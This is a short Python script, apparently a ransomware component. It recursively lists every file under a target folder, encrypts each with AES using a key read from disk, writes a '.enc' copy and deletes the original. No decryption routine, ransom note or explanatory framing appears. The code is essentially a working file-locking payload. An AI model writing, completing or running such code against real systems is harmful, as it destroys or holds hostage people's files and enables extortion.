import os
from sys import argv
from collections import deque
from typing import Iterable
from mykeys import read_bytes
from Crypto.Cipher import AES


def all_files(full_path_folder: str) -> Iterable:
    '''Returns a list(deque) with all the files in
    the given folder.'''
    list_of_all_files = deque()
    try:

        for root, __, files in os.walk(full_path_folder):
            for file in files:
                list_of_all_files.append(os.path.join(root, file))

        return list_of_all_files

    except FileNotFoundError:
        print(f"The folder '{full_path_folder}' does not exist.")
    except PermissionError:
        print(f"Without permission to access '{full_path_folder}'.")

    return list_of_all_files


def encrypt_file(file_name: str, aes_key: bytes) -> None:
    file_data = read_bytes(file_name)

    cipher = AES.new(aes_key, AES.MODE_EAX)

    encrypted_data, tag = cipher.encrypt_and_digest(file_data)

    with open(file_name + '.enc', 'wb') as f:
        f.write(cipher.nonce)
        f.write(tag)
        f.write(encrypted_data)


def delete_file(file_name: str) -> None:
    try:
        os.remove(file_name)
    except OSError as e:
        print(e)


def print_iterable(it: Iterable) -> None:
    for element in it:
        print(element)


if __name__ == '__main__':

    TARGET = None
    if len(argv) == 2 and argv[1] == 'test':
        from dotenv import load_dotenv
        load_dotenv()
        TARGET = os.getenv('TARGET')
    TARGET = '' if TARGET == None else TARGET

    print('target:', TARGET)

    target_files = all_files(TARGET)
    aes_key = read_bytes('aes_key.bin')
    for file in target_files:
        encrypt_file(file, aes_key)
        delete_file(file)
